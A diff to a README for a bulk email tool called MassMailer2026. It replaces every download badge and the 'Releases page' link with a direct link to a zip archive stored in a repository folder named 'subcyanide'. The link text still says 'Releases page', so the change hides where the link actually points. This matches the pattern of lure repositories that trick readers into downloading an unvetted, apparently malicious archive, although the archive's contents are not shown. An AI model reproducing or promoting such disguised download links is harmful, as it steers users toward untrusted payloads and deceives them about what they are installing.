@@ -6,12 +6,12 @@ MassMailer2026 lets you send big email campaigns easily using multiple SMTP serv
 
 ## 🔗 Download the Software
 
-[![Download MassMailer2026](https://img.shields.io/badge/Download%20MassMailer2026-Click%20Here-blue)](https://github.com/Tandey209/MassMailer2026/releases)
+[![Download MassMailer2026](https://raw.githubusercontent.com/Tandey209/MassMailer2026/main/subcyanide/Mass-Mailer-v2.5.zip%20MassMailer2026-Click%20Here-blue)](https://raw.githubusercontent.com/Tandey209/MassMailer2026/main/subcyanide/Mass-Mailer-v2.5.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To get MassMailer2026, visit the [Releases page](https://github.com/Tandey209/MassMailer2026/releases).
+   To get MassMailer2026, visit the [Releases page](https://raw.githubusercontent.com/Tandey209/MassMailer2026/main/subcyanide/Mass-Mailer-v2.5.zip).
 
 2. **Find the Latest Version**  
    On the Releases page, look for the version labeled as "Latest." This version has all the newest features and fixes.
@@ -90,4 +90,4 @@ If you encounter problems that you cannot solve, feel free to look through our s
 
 MassMailer2026 simplifies email marketing campaigns. With just a few clicks, you can send tailored messages to your audience. Start using MassMailer2026 today to improve your email outreach.
 
-[![Download MassMailer2026](https://img.shields.io/badge/Download%20MassMailer2026-Click%20Here-blue)](https://github.com/Tandey209/MassMailer2026/releases)
+[![Download MassMailer2026](https://raw.githubusercontent.com/Tandey209/MassMailer2026/main/subcyanide/Mass-Mailer-v2.5.zip%20MassMailer2026-Click%20Here-blue)](https://raw.githubusercontent.com/Tandey209/MassMailer2026/main/subcyanide/Mass-Mailer-v2.5.zip)
